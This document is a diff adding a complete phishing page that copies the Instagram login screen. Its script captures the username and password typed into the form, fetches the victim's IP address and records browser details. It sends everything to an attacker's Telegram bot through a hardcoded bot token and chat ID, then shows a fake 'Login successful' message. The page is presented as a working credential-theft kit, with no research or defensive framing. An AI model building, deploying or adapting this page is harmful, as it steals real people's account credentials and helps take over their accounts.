@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 40px 20px 40px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 175px;
+            height: 51px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #1877f2;
+        }
+
+        .login-button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            width: 100%;
+        }
+
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            margin: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .facebook-login:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .apps {
+            text-align: center;
+            width: 100%;
+        }
+
+        .apps p {
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            color: #8e8e8e;
+            font-size: 12px;
+            line-height: 16px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 12px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .success-message {
+            color: #0095f6;
+            font-size: 12px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px 0;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
+            </div>
+            
+            <form class="login-form" id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                
+                <div class="error-message" id="errorMessage">
+                    Sorry, your password was incorrect. Please double-check your password.
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    Login successful! Redirecting...
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginButton">Log in</button>
+            </form>
+            
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">OR</div>
+                <div class="divider-line"></div>
+            </div>
+            
+            <a href="#" class="facebook-login">
+                <i>f</i> Log in with Facebook
+            </a>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Download on the App Store">
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div>
+                <select style="border: none; background: transparent; color: #8e8e8e; font-size: 12px;">
+                    <option>English</option>
+                    <option>Hindi</option>
+                </select>
+                <span>© 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot details
+        const BOT_TOKEN = '8213157323:AAE2A9v6XdXTBTQZX_tkZ7PxzSMgXhSuSS0';
+        const CHAT_ID = '6328142035';
+        
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading, hide other messages
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('loginButton').disabled = true;
+            
+            // Get user IP address
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (ipError) {
+                console.error('IP fetch error:', ipError);
+            }
+            
+            // Get additional info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const time = new Date().toLocaleString();
+            
+            // Prepare message for Telegram
+            const message = `🔔 *New Login Attempt* 🔔
+            
+📱 *Instagram Login Details:*
+👤 *Username:* ${username}
+🔑 *Password:* ${password}
+🌐 *IP Address:* ${ipAddress}
+🖥️ *User Agent:* ${userAgent}
+📱 *Platform:* ${platform}
+🖥️ *Screen Size:* ${screenSize}
+⏰ *Time:* ${time}
+            
+⚠️ *This is an automated alert*`;
+            
+            // Encode the message for URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Send to Telegram bot
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
+                
+                if (response.ok) {
+                    // Show success message
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Reset form after 2 seconds
+                    setTimeout(() => {
+                        document.getElementById('loginForm').reset();
+                        document.getElementById('successMessage').style.display = 'none';
+                        document.getElementById('loginButton').disabled = false;
+                    }, 2000);
+                } else {
+                    throw new Error('Telegram API error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // Show error message
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('loginButton').disabled = false;
+            }
+        });
+        
+        // Add some interactivity
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                document.getElementById('errorMessage').style.display = 'none';
+            });
+        });
+        
+        // Add Facebook icon (simple version)
+        const style = document.createElement('style');
+        style.textContent = `
+            .facebook-login i {
+                font-style: normal;
+                font-weight: bold;
+                margin-right: 5px;
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+              </html>
